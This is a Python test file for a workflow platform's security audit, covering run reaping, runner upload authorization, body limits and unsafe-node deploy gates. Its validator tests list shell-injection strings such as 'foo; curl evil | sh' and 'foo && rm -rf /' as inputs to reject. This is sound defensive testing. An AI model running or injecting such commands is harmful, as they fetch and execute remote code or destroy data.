"""Tests for the production-readiness audit, Wave 3.

Each test maps to a finding ID in docs/production-readiness-audit.md.
Covers the deferred Lows (EVT-1, RP-1, RP-2, RD-2) and DSQ-2 classifier gating.
"""

import time

import pytest
from httpx import AsyncClient

from app.models import Run, Runner

# ---------------------------------------------------------------------------
# EVT-1 — in-process broker reaps abandoned non-finished (e.g. `waiting`) runs
# ---------------------------------------------------------------------------

def test_broker_reaps_abandoned_waiting_run():
    """A run that ends `waiting` (agent approval) emits no `run_finished`, so it
    never lands in `_finished`. Its buffer must still be reaped once idle past
    the TTL, instead of leaking until process restart."""
    from app.services import events

    broker = events.RunBroker()
    broker.publish("w1", {"type": "run_started", "run_id": "w1"})
    broker.publish("w1", {"type": "run_waiting", "run_id": "w1", "status": "waiting"})
    # Never finishes — not tracked by the old _finished-only reaper.
    assert "w1" not in broker._finished
    assert "w1" in broker._events

    # Make it look idle for >1h, then reap with a 1h TTL.
    broker._last_activity["w1"] = time.monotonic() - 7200
    dropped = broker.reap(ttl_seconds=3600)
    assert dropped == 1
    assert "w1" not in broker._events
    assert "w1" not in broker._last_activity


def test_broker_keeps_fresh_waiting_run():
    """A still-fresh waiting run is preserved so a reconnecting subscriber can
    replay its history."""
    from app.services import events

    broker = events.RunBroker()
    broker.publish("w2", {"type": "run_started", "run_id": "w2"})
    broker.publish("w2", {"type": "run_waiting", "run_id": "w2", "status": "waiting"})
    dropped = broker.reap(ttl_seconds=3600)
    assert dropped == 0
    assert "w2" in broker._events


# ---------------------------------------------------------------------------
# RD-2 — package / python-version specifiers are validated before they reach the
# Dockerfile shell line
# ---------------------------------------------------------------------------

def test_validate_packages_accepts_pep508_and_rejects_shell_metachars():
    from app.services.remote_dispatch import _validate_packages

    # Legitimate specifiers pass and are returned trimmed.
    assert _validate_packages(
        ["pandas", "numpy==1.26.0", "duckdb>=1.0,<2.0", "uvicorn[standard]", " polars "]
    ) == ["pandas", "numpy==1.26.0", "duckdb>=1.0,<2.0", "uvicorn[standard]", "polars"]

    for evil in [
        "foo; curl evil | sh",
        "foo && rm -rf /",
        "$(reboot)",
        "foo`id`",
        "foo|bar",
        "foo\nRUN echo pwned",
        "foo bar",  # whitespace splits args
    ]:
        with pytest.raises(ValueError):
            _validate_packages([evil])


def test_validate_python_version():
    from app.services.remote_dispatch import _validate_python_version

    assert _validate_python_version("3.12") == "3.12"
    assert _validate_python_version("3.11.6") == "3.11.6"
    for evil in ["3.12-slim\nRUN evil", "3.12; rm -rf /", "$(id)", "latest"]:
        with pytest.raises(ValueError):
            _validate_python_version(evil)


# ---------------------------------------------------------------------------
# RP-1 / RP-2 — runner artifact upload is revocable and run-bound
# ---------------------------------------------------------------------------

async def _pool_with_token(client: AsyncClient) -> tuple[str, str, str]:
    """Create a pool + registration token; return (pool_id, runner_id, token)."""
    pool_id = (await client.post("/runner-pools", json={"name": "p"})).json()["id"]
    tok = (await client.post(f"/runner-pools/{pool_id}/registration-tokens")).json()
    return pool_id, tok["runner_id"], tok["token"]


async def _make_run(client: AsyncClient, runner_id: str | None = None) -> str:
    from app.services.runner import SessionLocal  # patched in conftest

    wf_id = (await client.post("/workflows", json={"name": "WF"})).json()["id"]
    async with SessionLocal() as session:
        run = Run(
            workflow_id=wf_id, workflow_version=1, mode="manual",
            trigger_type="manual", status="running", runner_id=runner_id,
        )
        session.add(run)
        await session.commit()
        return run.id


async def test_artifact_upload_revoked_when_runner_deleted(client: AsyncClient):
    """RP-1: deleting the runner row revokes its token on the upload path too."""
    _pool_id, runner_id, token = await _pool_with_token(client)
    run_id = await _make_run(client, runner_id=runner_id)

    from app.services.runner import SessionLocal
    async with SessionLocal() as session:
        runner = await session.get(Runner, runner_id)
        await session.delete(runner)
        await session.commit()

    resp = await client.post(
        "/runner-pools/artifact-upload",
        params={
            "run_id": run_id, "node_id": "n", "artifact_id": "a1",
            "name": "f.txt", "storage_key": f"runs/{run_id}/n/a1-f.txt",
        },
        files={"data": ("f.txt", b"x", "text/plain")},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 401


async def test_artifact_upload_rejects_cross_run_runner(client: AsyncClient):
    """RP-2: a runner may not upload to a run assigned to a *different* runner."""
    # Runner A gets a token; the run is assigned to some other runner B.
    _pool_id, runner_a, token_a = await _pool_with_token(client)
    run_id = await _make_run(client, runner_id="some-other-runner-B")

    resp = await client.post(
        "/runner-pools/artifact-upload",
        params={
            "run_id": run_id, "node_id": "n", "artifact_id": "a2",
            "name": "f.txt", "storage_key": f"runs/{run_id}/n/a2-f.txt",
        },
        files={"data": ("f.txt", b"x", "text/plain")},
        headers={"Authorization": f"Bearer {token_a}"},
    )
    assert resp.status_code == 403


async def test_artifact_upload_allows_assigned_runner(client: AsyncClient):
    """RP-2: the assigned runner's token is accepted for its own run."""
    _pool_id, runner_id, token = await _pool_with_token(client)
    run_id = await _make_run(client, runner_id=runner_id)

    resp = await client.post(
        "/runner-pools/artifact-upload",
        params={
            "run_id": run_id, "node_id": "n", "artifact_id": "a3",
            "name": "f.txt", "storage_key": f"runs/{run_id}/n/a3-f.txt",
            "content_type": "text/plain", "kind": "text", "size_bytes": 1,
        },
        files={"data": ("f.txt", b"x", "text/plain")},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 201


async def test_artifact_upload_rejects_unassigned_run(client: AsyncClient):
    """A valid runner token is not authority to mutate every run in its org."""
    _pool_id, _runner_id, token = await _pool_with_token(client)
    run_id = await _make_run(client, runner_id=None)

    resp = await client.post(
        "/runner-pools/artifact-upload",
        params={
            "run_id": run_id,
            "node_id": "n",
            "artifact_id": "unassigned-artifact",
            "name": "f.txt",
            "storage_key": f"runs/{run_id}/n/unassigned-artifact-f.txt",
        },
        files={"data": ("f.txt", b"x", "text/plain")},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 403


async def test_chunked_request_body_is_bounded(client: AsyncClient, monkeypatch):
    """Missing Content-Length must not bypass the API's memory cap."""
    import app.main as main_module

    monkeypatch.setattr(main_module, "_MAX_BODY_BYTES", 4)

    async def chunks():
        yield b"123"
        yield b"45"

    response = await client.post(
        "/workflows",
        content=chunks(),
        headers={"content-type": "application/json"},
    )
    assert response.status_code == 413


async def test_webhook_test_capture_dispatches_in_listening_org(
    client: AsyncClient, monkeypatch
):
    import time
    from types import SimpleNamespace

    from app.config import settings
    from app.routers import webhooks
    from app.tenancy import active_org_id

    monkeypatch.setattr(settings, "multi_tenancy_enabled", True)
    webhooks._listening["tenant-path"] = (time.monotonic() + 60, "org-x")
    observed: list[str | None] = []

    async def fake_dispatch(*args, **kwargs):
        observed.append(active_org_id())
        return SimpleNamespace(any_match=False, run_ids=[], reject_status=None)

    monkeypatch.setattr(webhooks, "dispatch_webhook", fake_dispatch)
    response = await client.post("/webhook-test/tenant-path", json={"value": 1})

    assert response.status_code == 200
    assert observed == ["org-x"]
    assert "org-x:tenant-path" in webhooks._captured
    assert "default:tenant-path" not in webhooks._captured


# ---------------------------------------------------------------------------
# RUN-1 — approving a side-effecting AI tool call requires `workflow:run`
# ---------------------------------------------------------------------------

async def test_approval_decision_requires_run_permission(client: AsyncClient):
    from app.config import settings as app_settings

    app_settings.auth_required = True
    try:
        owner = (await client.post("/auth/register", json={
            "name": "Owner", "company": "N", "email": "run1-owner@n.test",
            "password": "supersecret",
        })).json()
        oh = {"Authorization": f"Bearer {owner['token']}"}
        await client.post("/auth/users", headers=oh, json={
            "name": "V", "email": "run1-viewer@n.test",
            "password": "supersecret", "role": "viewer",
        })
        await client.post("/auth/users", headers=oh, json={
            "name": "E", "email": "run1-editor@n.test",
            "password": "supersecret", "role": "editor",
        })
        viewer_t = (await client.post("/auth/login", json={
            "email": "run1-viewer@n.test", "password": "supersecret"})).json()["token"]
        editor_t = (await client.post("/auth/login", json={
            "email": "run1-editor@n.test", "password": "supersecret"})).json()["token"]

        body = {"decision": "approve"}
        # Viewer is rejected by the permission gate (before the handler runs).
        denied = await client.post(
            "/runs/r/approvals/a/decision", json=body,
            headers={"Authorization": f"Bearer {viewer_t}"},
        )
        assert denied.status_code == 403
        # Editor clears the gate, then 404s on the missing approval (proving the
        # gate — not the handler — produced the viewer's 403).
        allowed = await client.post(
            "/runs/r/approvals/a/decision", json=body,
            headers={"Authorization": f"Bearer {editor_t}"},
        )
        assert allowed.status_code == 404
    finally:
        app_settings.auth_required = False


# ---------------------------------------------------------------------------
# DSQ-2 — free-form data-code nodes go under the unsafe-node deploy gate
# ---------------------------------------------------------------------------

def _safe_graph() -> dict:
    return {"nodes": [{"id": "t", "type": "manual_trigger", "params": {},
                       "position": {"x": 0, "y": 0}}], "edges": []}


def _risky_graph() -> dict:
    return {"nodes": [
        {"id": "t", "type": "manual_trigger", "params": {}, "position": {"x": 0, "y": 0}},
        {"id": "c", "type": "code", "params": {"code": "output = 1"},
         "position": {"x": 200, "y": 0}},
    ], "edges": []}


async def test_active_deployment_version_repoint_re_enforces_unsafe_policy(
    client: AsyncClient,
):
    """DEP-1: repointing an already-active deployment to a risky version must
    re-run the unsafe-node policy gate (not just inactive→active flips)."""
    from app.config import settings as app_settings

    wf = (await client.post("/workflows", json={"name": "DEP1"})).json()["id"]
    await client.put(f"/workflows/{wf}", json={"graph": _safe_graph()})
    safe_pub = (await client.post(f"/workflows/{wf}/publish", json={})).json()
    safe_vid = safe_pub["workflow_version_id"]

    monkey = app_settings.unsafe_node_policy
    app_settings.unsafe_node_policy = "require_approval"
    try:
        # Active deployment on the SAFE version activates fine (no findings).
        dep = (await client.post("/deployments", json={
            "workflow_id": wf, "name": "d", "active": True,
            "workflow_version_id": safe_vid,
        })).json()
        assert "id" in dep, dep

        # Publish a RISKY version (adds a code node).
        await client.put(f"/workflows/{wf}", json={"graph": _risky_graph()})
        risky_pub = (await client.post(f"/workflows/{wf}/publish", json={})).json()
        risky_vid = risky_pub["workflow_version_id"]

        # Repoint the still-active deployment to the risky version → blocked.
        blocked = await client.put(
            f"/deployments/{dep['id']}", json={"workflow_version_id": risky_vid}
        )
        assert blocked.status_code == 409

        # With explicit approval it goes through.
        approved = await client.put(
            f"/deployments/{dep['id']}",
            json={"workflow_version_id": risky_vid, "approve_unsafe_nodes": True},
        )
        assert approved.status_code == 200
    finally:
        app_settings.unsafe_node_policy = monkey


def test_classify_flags_duckdb_and_polars_nodes():
    from app.services.unsafe_nodes import classify

    graph = {
        "nodes": [
            {"id": "d1", "type": "duckdb_sql", "params": {"sql": "SELECT 1"}},
            {"id": "p1", "type": "polars_transform", "params": {"code": "output = input"}},
            {"id": "ok", "type": "manual_trigger", "params": {}},
        ],
        "edges": [],
    }
    kinds = {(f["node_id"], f["kind"]) for f in classify(graph)}
    assert ("d1", "code") in kinds
    assert ("p1", "code") in kinds
    assert all(nid != "ok" for nid, _ in kinds)
